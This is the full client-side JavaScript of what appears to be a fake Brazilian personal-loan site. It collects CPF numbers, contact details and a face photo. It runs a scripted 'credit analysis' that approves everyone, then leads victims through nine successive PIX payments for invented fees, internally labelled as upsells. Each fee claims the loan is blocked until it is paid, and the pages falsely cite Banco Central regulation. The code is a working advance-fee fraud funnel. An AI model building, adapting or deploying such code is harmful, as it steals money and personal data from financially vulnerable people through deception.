(function () {
  const app = document.getElementById('app');
  const AMOUNTS = [3000, 5000, 10000, 15000, 20000, 30000];
  const MONTHS = [12, 24, 36, 48, 60, 84, 120];
  const RATE = 0.00781;
  const BANKS = ['Nubank', 'Inter', 'Itaú', 'Bradesco', 'Caixa', 'Banco do Brasil', 'Santander', 'PicPay', 'Mercado Pago', 'C6 Bank', 'Outro'];
  const PAYS = {
    '/pagamento-taxa': { product: 'agil-taxa', cents: 2681, title: 'Taxa de verificação', next: '/upsell2', kicker: 'Upsell 1', text: 'Proteção antifraude em operações de crédito. Confirmação do beneficiário pelo Banco Central e liberação segura do PIX após a validação.' },
    '/upsell1': { product: 'agil-taxa', cents: 2681, title: 'Taxa de verificação', next: '/upsell2', kicker: 'Upsell 1', text: 'Pendência de verificação identificada. Sem essa etapa a transferência não pode ser processada.' },
    '/upsell2': { product: 'agil-tenf', cents: 1990, title: 'Taxa TENF', next: '/upsell3', kicker: 'Upsell 2', text: 'Regularize a taxa TENF para documentar a operação e liberar o crédito em até 10 minutos via PIX.' },
    '/upsell3': { product: 'agil-titularidade', cents: 2641, title: 'Confirmação de titularidade', next: '/upsell4', kicker: 'Upsell 3', text: 'A conta ainda não foi confirmada. Sem essa etapa a transferência não pode ser processada. Obrigatória pelo BACEN em crédito pessoal.' },
    '/upsell4': { product: 'agil-iof', cents: 2344, title: 'IOF federal', next: '/upsell5', kicker: 'Upsell 4', text: 'O IOF é recolhido uma única vez na liberação. Sem o recolhimento, o crédito fica bloqueado até a quitação.' },
    '/upsell5': { product: 'agil-cashback', cents: 1700, title: 'Ativação cashback', next: '/upsell6', kicker: 'Upsell 5', text: 'Ative o cashback para recuperar as taxas pagas junto com a liberação do crédito.' },
    '/upsell6': { product: 'agil-pix', cents: 3700, title: 'Liberação do PIX', next: '/upsell7', kicker: 'Upsell 6', text: 'Pagamento único para colocar a transferência na fila e receber o PIX na conta informada.' },
    '/upsell7': { product: 'agil-conta', cents: 4990, title: 'Conta Ágil', next: '/upsell8', kicker: 'Upsell 7', text: 'Ative a Conta Ágil verificada para receber novas liberações com a mesma titularidade.' },
    '/upsell8': { product: 'agil-envio', cents: 2360, title: 'Envio do cartão', next: '/upsell9', kicker: 'Upsell 8', text: 'Pague somente o envio do cartão físico. A ativação do limite segue na próxima etapa.' },
    '/upsell9': { product: 'agil-virtual', cents: 1990, title: 'Cartão virtual', next: '/sucesso', kicker: 'Upsell 9', text: 'R$ 19,90 uma vez. Ative para usar o cartão virtual imediatamente.' }
  };

  function money(n) {
    return Number(n || 0).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  }
  function centsLabel(c) { return money(c / 100); }
  function get(k, d) { return localStorage.getItem(k) || d || ''; }
  function set(k, v) { localStorage.setItem(k, String(v)); }
  function qs() { return location.search || ''; }
  function path() { return (location.pathname || '/').replace(/\/+$/, '') || '/'; }
  function go(to) {
    history.pushState({}, '', to + qs());
    render();
  }
  function amount() { return Math.min(30000, Math.max(500, Number(get('selectedLoanAmount', '10000')) || 10000)); }
  function months() { return Number(get('selectedInstallments', '120')) || 120; }
  function parcela(valor, n) {
    const f = Math.pow(1 + RATE, n);
    return valor * RATE * f / (f - 1);
  }
  function saveQuote(valor, n) {
    const p = parcela(valor, n);
    set('selectedLoanAmount', valor);
    set('selectedInstallments', n);
    set('selectedMonthlyPayment', p.toFixed(2));
    set('approvedAmount', valor);
  }
  function validCpf(raw) {
    const d = String(raw || '').replace(/\D/g, '');
    if (d.length !== 11 || /^(\d)\1+$/.test(d)) return false;
    let s = 0;
    for (let i = 0; i < 9; i++) s += Number(d[i]) * (10 - i);
    let r = (s * 10) % 11; if (r === 10) r = 0;
    if (r !== Number(d[9])) return false;
    s = 0;
    for (let i = 0; i < 10; i++) s += Number(d[i]) * (11 - i);
    r = (s * 10) % 11; if (r === 10) r = 0;
    return r === Number(d[10]);
  }
  function maskCpf(v) {
    const d = v.replace(/\D/g, '').slice(0, 11);
    return d.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  }
  function maskPhone(v) {
    const d = v.replace(/\D/g, '').slice(0, 11);
    if (d.length < 3) return d;
    if (d.length < 7) return '(' + d.slice(0, 2) + ') ' + d.slice(2);
    return '(' + d.slice(0, 2) + ') ' + d.slice(2, 7) + '-' + d.slice(7);
  }
  function logo() {
    return '<div class="logo"><span class="mark">A</span><span>AGIL<small>EMPRÉSTIMO</small></span></div>';
  }
  function track(event, params) {
    if (!window.ttq) return;
    try { ttq.track(event, params || {}); } catch (e) {}
  }
  function bootUtm() {
    const params = new URLSearchParams(location.search);
    ['utm_source', 'utm_campaign', 'utm_id', 'utm_medium', 'utm_content', 'utm_term', 'fbclid', 'gclid', 'ttclid', 'click_id'].forEach(function (key) {
      const value = params.get(key);
      if (value) localStorage.setItem(key, value);
    });
  }

  function home() {
    const valor = amount();
    return '<div class="home"><div class="wrap"><header class="hero">' +
      '<div class="top">' + logo() + '<span class="pill">R$ Gratuito</span></div>' +
      '<div class="badge">Crédito pessoal pré-aprovado</div>' +
      '<h1>Até <em>R$ 30.000</em> na sua conta hoje.</h1>' +
      '<p class="lead">Simule sem sair de casa e receba via Pix, rápido e sem burocracia.</p>' +
      '<div class="checks"><span>Aprova negativado</span><span>Sem fiador</span><span>Pix em 10 min</span></div>' +
      '</header><section class="sheet">' +
      '<div class="row-between"><h2>Simule seu crédito</h2><span class="tag">PRÉ-APROVADO</span></div>' +
      '<p class="sub">Arraste para escolher o valor:</p>' +
      '<div class="amount-box"><small>VALOR SOLICITADO</small><strong id="homeAmount">' + money(valor) + '</strong>' +
      '<div class="chips"><i id="homeParc">' + months() + 'x · ' + money(parcela(valor, months())) + '</i><i>1,81% a.m.</i></div>' +
      '<input id="homeRange" type="range" min="500" max="30000" step="500" value="' + valor + '">' +
      '<div class="ends"><span>R$ 500</span><span>R$ 30.000</span></div></div>' +
      '<div class="presets">' + AMOUNTS.map(function (n) {
        return '<button type="button" data-amt="' + n + '" class="' + (n === valor ? 'on' : '') + '">' + (n / 1000) + 'k</button>';
      }).join('') + '</div>' +
      '<button class="cta" id="goSim">Solicitar agora →</button>' +
      '<div class="social"><span>+500k aprovados</span><span class="stars">★★★★★ 4.9</span></div>' +
      '</section>' +
      '<section class="section"><h2>Por que a Ágil?</h2>' +
      '<div class="card"><b>Análise instantânea</b><p>Resultado na hora, sem consulta que trave o CPF.</p></div>' +
      '<div class="card"><b>Dinheiro na conta após aprovação</b><p>Liberação via PIX em até 10 minutos.</p></div>' +
      '<div class="card"><b>100% online</b><p>Simulação, contrato e recebimento sem sair de casa.</p></div></section>' +
      '<section class="section"><h2>Como funciona?</h2>' +
      '<div class="card"><b>1. Simule</b><p>Escolha o valor e as parcelas.</p></div>' +
      '<div class="card"><b>2. Cadastre</b><p>CPF, contato e conta para o PIX.</p></div>' +
      '<div class="card"><b>3. Receba</b><p>Assine e acompanhe a liberação.</p></div></section>' +
      '<section class="section"><div class="card"><h2>Seu crédito a um Pix de distância.</h2><p>Simule agora sem compromisso e receba uma proposta personalizada.</p>' +
      '<button class="cta" id="goSim2">Simular meu crédito grátis</button>' +
      '<p class="note" style="margin-top:10px">Zero compromisso · Sem consulta SPC · 100% online</p></div></section>' +
      '<footer class="foot">Ágil Empréstimo · CNPJ 36.947.229/0001-85<br>© 2026 Ágil. Todos os direitos reservados.<br>Av. das Nações Unidas, 14261 · São Paulo/SP</footer>' +
      '</div></div>';
  }

  function simulacao() {
    const valor = amount();
    const n = months();
    const p = parcela(valor, n);
    return shell('Simule seu crédito', 'Resultado instantâneo, sem compromisso',
      '<p class="label">QUANTO VOCÊ PRECISA?</p><div class="price" id="simAmount">' + money(valor) + '</div>' +
      '<input id="simRange" type="range" min="1000" max="30000" step="500" value="' + valor + '">' +
      '<div class="ends"><span>R$ 1.000</span><span>R$ 30.000</span></div>' +
      '<div class="presets">' + [2000, 5000, 10000, 15000, 20000, 30000].map(function (v) {
        return '<button type="button" data-amt="' + v + '" class="' + (v === valor ? 'on' : '') + '">R$ ' + (v / 1000) + 'k</button>';
      }).join('') + '</div>' +
      '<p class="label">EM QUANTAS PARCELAS?</p><div class="parcels">' + MONTHS.map(function (m) {
        return '<button type="button" data-mes="' + m + '" class="' + (m === n ? 'on' : '') + '">' + m + ' x</button>';
      }).join('') + '</div>' +
      '<div class="quote"><small>SUA PARCELA ESTIMADA</small><strong id="simParc">' + money(p) + '</strong>' +
      '<p id="simTotal">em ' + n + ' x · Total: ' + money(p * n) + '</p><p>PIX em minutos</p>' +
      '<p class="note" style="color:#B7F7D0">Aprovação em segundos · Sem consulta SPC/Serasa</p></div>' +
      '<div class="cpf-box"><b>Digite seu CPF</b><p class="note">Para liberar sua proposta personalizada</p>' +
      '<div class="field"><input id="cpf" inputmode="numeric" placeholder="000.000.000-00" value="' + maskCpf(get('cpf')) + '"></div>' +
      '<p class="note">Dados criptografados e protegidos pela LGPD</p></div>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="verProposta" disabled>Ver Minha Proposta →</button>' +
      '<p class="note" style="text-align:center;margin-top:8px">Regulado pelo Banco Central · SSL 256-bit</p>'
    );
  }

  function cadastro() {
    return shell('Seus dados', 'A proposta fica no nome de quem recebe o PIX',
      '<div class="field"><label>Nome completo</label><input id="nome" value="' + esc(get('nome')) + '" placeholder="Como no documento"></div>' +
      '<div class="field"><label>E-mail</label><input id="email" type="email" value="' + esc(get('email')) + '" placeholder="voce@email.com"></div>' +
      '<div class="field"><label>Celular</label><input id="telefone" inputmode="tel" value="' + esc(maskPhone(get('telefone'))) + '" placeholder="(11) 90000-0000"></div>' +
      '<div class="field"><label>CPF</label><input id="cpf2" value="' + esc(maskCpf(get('cpf'))) + '" inputmode="numeric"></div>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="goAnalise">Solicitar análise gratuita</button>'
    );
  }

  function analisando() {
    return shell('Analisando seu crédito', 'Isso leva poucos segundos',
      '<div class="progress"><i id="bar"></i></div>' +
      '<div class="steps" id="steps">' +
      ['Consultando score de crédito', 'Birô de crédito consultado', 'Calculando limite disponível', 'Análise de capacidade financeira', 'Aprovando solicitação'].map(function (t, i) {
        return '<div class="step" data-i="' + i + '"><span class="dot"></span><span>' + t + '</span></div>';
      }).join('') + '</div>'
    );
  }

  function proposta() {
    const valor = amount();
    const n = months();
    const p = parcela(valor, n);
    return shell('Proposta pré-aprovada', 'Reservada para você',
      '<div class="quote"><small>CRÉDITO PRÉ-APROVADO</small><strong>' + money(valor) + '</strong>' +
      '<p>' + n + 'x de ' + money(p) + ' · PIX em até 10 minutos</p></div>' +
      '<div class="card"><b>Forma de liberação</b><p>PIX instantâneo na conta que você informar.</p></div>' +
      '<div class="card"><b>Próximos passos</b><p>Documentos, verificação, assinatura e liberação via PIX.</p></div>' +
      '<p class="note">Após o prazo, a taxa pode ser reajustada.</p>' +
      '<button class="cta" id="goDocs">Aceitar proposta e continuar</button>'
    );
  }

  function documentos() {
    return shell('Documentos', 'Marque para habilitar o botão. Seus dados são criptografados.',
      '<label class="checkline"><input type="checkbox" class="doc"> Holerite ou extrato bancário</label>' +
      '<label class="checkline"><input type="checkbox" class="doc"> Comprovante de residência (luz, água ou gás)</label>' +
      '<label class="checkline"><input type="checkbox" class="doc"> Documento com foto</label>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="goVer" disabled>Continuar</button>'
    );
  }

  function verificacao() {
    return shell('Verificar identidade', 'Sua imagem é criptografada e não será compartilhada.',
      '<div class="card"><b>Tecnologia biométrica</b><p>Uma foto do rosto confirma que a solicitação é sua.</p></div>' +
      '<div class="field"><label>Foto</label><input id="foto" type="file" accept="image/*" capture="user"></div>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="goContrato">Iniciar verificação</button>' +
      '<button class="ghost" id="pular" style="width:100%;margin-top:8px">Pular verificação</button>'
    );
  }

  function contrato() {
    const valor = amount();
    return shell('Contrato digital', 'Ágil Empréstimo · CNPJ 36.947.229/0001-85',
      '<p class="note">O cliente confirma a quantia líquida de ' + money(valor) + ', nas condições desta proposta. O crédito é liberado via PIX em até 3 minutos após a assinatura.</p>' +
      '<div class="card"><b>Prazo de liberação</b><p>Até 10 minutos · Crédito via PIX instantâneo</p></div>' +
      '<label class="checkline"><input type="checkbox" id="aceite"> Li e aceito as condições do contrato</label>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="goSaldo" disabled>Confirmar empréstimo</button>'
    );
  }

  function saldo() {
    const opts = BANKS.map(function (b) { return '<option' + (get('banco') === b ? ' selected' : '') + '>' + b + '</option>'; }).join('');
    return shell('Conta para o PIX', 'Valor disponível em conta depois da confirmação',
      '<div class="field"><label>Banco</label><select id="banco">' + opts + '</select></div>' +
      '<div class="field"><label>Tipo da chave</label><select id="tipo"><option>CPF</option><option>Celular</option><option>E-mail</option><option>Aleatória</option></select></div>' +
      '<div class="field"><label>Chave PIX</label><input id="chave" value="' + esc(get('chave_pix') || get('cpf')) + '"></div>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="goTaxa">Finalizar solicitação</button>'
    );
  }

  function calculando() {
    return shell('Calculando taxas', 'Enquanto preparamos a liberação',
      '<div class="progress"><i id="bar" style="width:15%"></i></div>' +
      '<div class="steps"><div class="step on"><span class="dot"></span><span>Conferindo titularidade</span></div>' +
      '<div class="step"><span class="dot"></span><span>Montando a fila do PIX</span></div>' +
      '<div class="step"><span class="dot"></span><span>Separando pendências</span></div></div>'
    );
  }

  function sucesso() {
    return shell('Crédito em processamento', 'As confirmações foram registradas',
      '<div class="quote"><small>LIBERAÇÃO</small><strong>' + money(amount()) + '</strong><p>PIX em até 10 minutos na chave informada.</p></div>' +
      '<div class="card"><b>Conta</b><p>' + esc(get('banco') || 'Banco') + ' · ' + esc(get('chave_pix') || 'chave PIX') + '</p></div>' +
      '<button class="cta" id="voltar">Voltar ao início</button>'
    );
  }

  function pagamento(info) {
    return shell(info.title, info.kicker,
      '<div class="price">' + centsLabel(info.cents) + '</div>' +
      '<p class="note">' + info.text + '</p>' +
      '<p class="note">Pagamento único · Sem cobrança mensal. Ambiente seguro.</p>' +
      '<div id="pixArea"></div>' +
      '<div class="err" id="err"></div>' +
      '<button class="cta" id="pagar">Pagar ' + centsLabel(info.cents) + '</button>'
    );
  }

  function shell(title, sub, inner) {
    return '<div class="stage"><div class="panel"><div class="brandline">' + logo() + '<button class="back" id="back">Voltar</button></div>' +
      '<div class="row-between"><div><h2>' + title + '</h2><p class="sub">' + sub + '</p></div><span class="tag">PRÉ-APROVADO</span></div>' +
      inner + '</div></div>';
  }

  function esc(s) {
    return String(s || '').replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function paintQuote() {
    const valor = amount();
    const n = months();
    const p = parcela(valor, n);
    const a = document.getElementById('simAmount') || document.getElementById('homeAmount');
    if (a) a.textContent = money(valor);
    const parc = document.getElementById('simParc');
    const total = document.getElementById('simTotal');
    const homeParc = document.getElementById('homeParc');
    if (parc) parc.textContent = money(p);
    if (total) total.textContent = 'em ' + n + ' x · Total: ' + money(p * n);
    if (homeParc) homeParc.textContent = n + 'x · ' + money(p);
    const range = document.getElementById('homeRange') || document.getElementById('simRange');
    if (range) range.value = String(valor);
    document.querySelectorAll('[data-amt]').forEach(function (b) {
      b.classList.toggle('on', Number(b.getAttribute('data-amt')) === valor);
    });
    document.querySelectorAll('[data-mes]').forEach(function (b) {
      b.classList.toggle('on', Number(b.getAttribute('data-mes')) === n);
    });
  }

  function syncCpfButton() {
    const input = document.getElementById('cpf');
    const btn = document.getElementById('verProposta');
    if (!input || !btn) return;
    btn.disabled = !validCpf(input.value);
  }

  async function criarPix(info) {
    const err = document.getElementById('err');
    const btn = document.getElementById('pagar');
    err.textContent = '';
    btn.disabled = true;
    btn.textContent = 'Gerando PIX...';
    const params = new URLSearchParams(location.search);
    const tracking = {
      utm_source: params.get('utm_source') || get('utm_source'),
      utm_medium: params.get('utm_medium') || get('utm_medium'),
      utm_campaign: params.get('utm_campaign') || get('utm_campaign'),
      utm_id: params.get('utm_id') || get('utm_id'),
      utm_content: params.get('utm_content') || '',
      utm_term: params.get('utm_term') || '',
      ttclid: params.get('ttclid') || get('ttclid'),
      ttp: (document.cookie.match(/(?:^|; )_ttp=([^;]+)/) || [])[1] || ''
    };
    try {
      const res = await fetch('/api/pix/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: get('nome'),
          email: get('email'),
          document: get('cpf'),
          phone: get('telefone'),
          product: info.product,
          tracking: tracking
        })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Falha ao gerar o PIX.');
      track('InitiateCheckout', { value: info.cents / 100, currency: 'BRL', content_id: info.product, content_type: 'product' });
      const area = document.getElementById('pixArea');
      area.innerHTML = '<div class="pixbox" id="pixCode">' + esc(data.qrCode || '') + '</div>' +
        '<button class="ghost" id="copiar" type="button" style="width:100%;margin-top:8px">Copiar código</button>' +
        '<p class="wait">Aguardando pagamento de ' + centsLabel(info.cents) + '</p>';
      document.getElementById('copiar').onclick = function () {
        navigator.clipboard.writeText(data.qrCode || '');
      };
      btn.textContent = 'PIX gerado';
      poll(data.transactionId || data.id, info);
    } catch (e) {
      err.textContent = e.message || 'Não foi possível gerar o PIX.';
      btn.disabled = false;
      btn.textContent = 'Pagar ' + centsLabel(info.cents);
    }
  }

  function payInfo() {
    const current = path();
    const info = PAYS[current];
    return info ? Object.assign({ path: current }, info) : null;
  }

  function poll(id, info) {
    if (!id) return;
    const timer = setInterval(async function () {
      if (path() !== info.path) {
        clearInterval(timer);
        return;
      }
      try {
        const res = await fetch('/api/pix/status?id=' + encodeURIComponent(id));
        const data = await res.json();
        if (data.status === 'approved' || data.status === 'paid') {
          clearInterval(timer);
          track('CompletePayment', { value: info.cents / 100, currency: 'BRL', content_id: info.product, content_type: 'product' });
          go(info.next);
        }
      } catch (e) {}
    }, 4000);
  }

  function bind() {
    const back = document.getElementById('back');
    if (back) back.onclick = function () { history.back(); };
    document.querySelectorAll('[data-amt]').forEach(function (b) {
      b.onclick = function () { saveQuote(Number(b.getAttribute('data-amt')), months()); paintQuote(); };
    });
    document.querySelectorAll('[data-mes]').forEach(function (b) {
      b.onclick = function () { saveQuote(amount(), Number(b.getAttribute('data-mes'))); paintQuote(); };
    });
    const homeRange = document.getElementById('homeRange');
    if (homeRange) homeRange.oninput = function () { saveQuote(Number(homeRange.value), months()); paintQuote(); };
    const simRange = document.getElementById('simRange');
    if (simRange) simRange.oninput = function () { saveQuote(Number(simRange.value), months()); paintQuote(); };
    const goSim = function () { saveQuote(amount(), months()); go('/simulacao'); };
    if (document.getElementById('goSim')) document.getElementById('goSim').onclick = goSim;
    if (document.getElementById('goSim2')) document.getElementById('goSim2').onclick = goSim;
    const cpf = document.getElementById('cpf');
    if (cpf) {
      cpf.oninput = function () { cpf.value = maskCpf(cpf.value); syncCpfButton(); };
      syncCpfButton();
    }
    const ver = document.getElementById('verProposta');
    if (ver) ver.onclick = function () {
      if (!validCpf(cpf.value)) { document.getElementById('err').textContent = 'CPF inválido.'; return; }
      set('cpf', cpf.value);
      track('SubmitForm', { content_id: 'cpf', content_type: 'product' });
      go('/cadastro');
    };
    const tel = document.getElementById('telefone');
    if (tel) tel.oninput = function () { tel.value = maskPhone(tel.value); };
    const cpf2 = document.getElementById('cpf2');
    if (cpf2) cpf2.oninput = function () { cpf2.value = maskCpf(cpf2.value); };
    const goAnalise = document.getElementById('goAnalise');
    if (goAnalise) goAnalise.onclick = function () {
      const nome = document.getElementById('nome').value.trim();
      const email = document.getElementById('email').value.trim();
      const phone = document.getElementById('telefone').value.trim();
      const doc = document.getElementById('cpf2').value;
      const err = document.getElementById('err');
      if (nome.length < 5 || !email.includes('@') || phone.replace(/\D/g, '').length < 10 || !validCpf(doc)) {
        err.textContent = 'Preencha nome, e-mail, celular e um CPF válido.';
        return;
      }
      set('nome', nome); set('email', email); set('telefone', phone); set('cpf', doc);
      track('CompleteRegistration', { content_id: 'cadastro', content_type: 'product' });
      go('/analisando');
    };
    document.querySelectorAll('.doc').forEach(function (box) {
      box.onchange = function () {
        const ok = [...document.querySelectorAll('.doc')].every(function (el) { return el.checked; });
        document.getElementById('goVer').disabled = !ok;
      };
    });
    if (document.getElementById('goDocs')) document.getElementById('goDocs').onclick = function () { go('/documentos'); };
    if (document.getElementById('goVer')) document.getElementById('goVer').onclick = function () { go('/verificacao'); };
    const foto = document.getElementById('foto');
    if (foto) foto.onchange = function () {
      const file = foto.files && foto.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = function () { set('nbk_captured_photo', reader.result); };
      reader.readAsDataURL(file);
    };
    if (document.getElementById('goContrato')) document.getElementById('goContrato').onclick = function () { go('/contrato'); };
    if (document.getElementById('pular')) document.getElementById('pular').onclick = function () { go('/contrato'); };
    const aceite = document.getElementById('aceite');
    if (aceite) aceite.onchange = function () { document.getElementById('goSaldo').disabled = !aceite.checked; };
    if (document.getElementById('goSaldo')) document.getElementById('goSaldo').onclick = function () { go('/saldo'); };
    if (document.getElementById('goTaxa')) document.getElementById('goTaxa').onclick = function () {
      const chave = document.getElementById('chave').value.trim();
      if (chave.length < 5) { document.getElementById('err').textContent = 'Informe a chave PIX.'; return; }
      set('banco', document.getElementById('banco').value);
      set('tipo_pix', document.getElementById('tipo').value);
      set('chave_pix', chave);
      track('AddPaymentInfo', { content_id: 'chave_pix', content_type: 'product' });
      go('/calculando-taxa');
    };
    if (document.getElementById('pagar')) {
      const info = payInfo();
      document.getElementById('pagar').onclick = function () { criarPix(info); };
    }
    if (document.getElementById('voltar')) document.getElementById('voltar').onclick = function () { go('/'); };
    if (path() === '/analisando') runAnalysis();
    if (path() === '/calculando-taxa') setTimeout(function () { if (path() === '/calculando-taxa') go('/pagamento-taxa'); }, 2200);
  }

  function runAnalysis() {
    const items = [...document.querySelectorAll('.step')];
    const bar = document.getElementById('bar');
    let i = 0;
    const timer = setInterval(function () {
      if (path() !== '/analisando') { clearInterval(timer); return; }
      items.forEach(function (el, idx) {
        el.classList.toggle('done', idx < i);
        el.classList.toggle('on', idx === i);
      });
      if (bar) bar.style.width = Math.min(100, (i / items.length) * 100) + '%';
      i += 1;
      if (i > items.length) {
        clearInterval(timer);
        track('ViewContent', { content_id: 'proposta', content_type: 'product' });
        go('/proposta');
      }
    }, 700);
  }

  function render() {
    const p = path();
    let html = '';
    if (p === '/' || p === '/index.html') html = home();
    else if (p === '/simulacao') html = simulacao();
    else if (p === '/cadastro') html = cadastro();
    else if (p === '/analisando' || p === '/processando') html = analisando();
    else if (p === '/proposta' || p === '/resultado') html = proposta();
    else if (p === '/documentos') html = documentos();
    else if (p === '/verificacao') html = verificacao();
    else if (p === '/contrato') html = contrato();
    else if (p === '/saldo' || p === '/editar-conta') html = saldo();
    else if (p === '/calculando-taxa' || p === '/processando-transferencia') html = calculando();
    else if (p === '/sucesso' || p === '/comprovante-taxa' || p === '/upsell10' || p === '/retorno') html = sucesso();
    else if (PAYS[p]) html = pagamento(PAYS[p]);
    else html = home();
    app.innerHTML = html;
    document.title = 'Ágil - Empréstimo Pessoal';
    bind();
    window.scrollTo(0, 0);
  }

  bootUtm();
  saveQuote(amount(), months());
  window.addEventListener('popstate', render);
  render();
})();
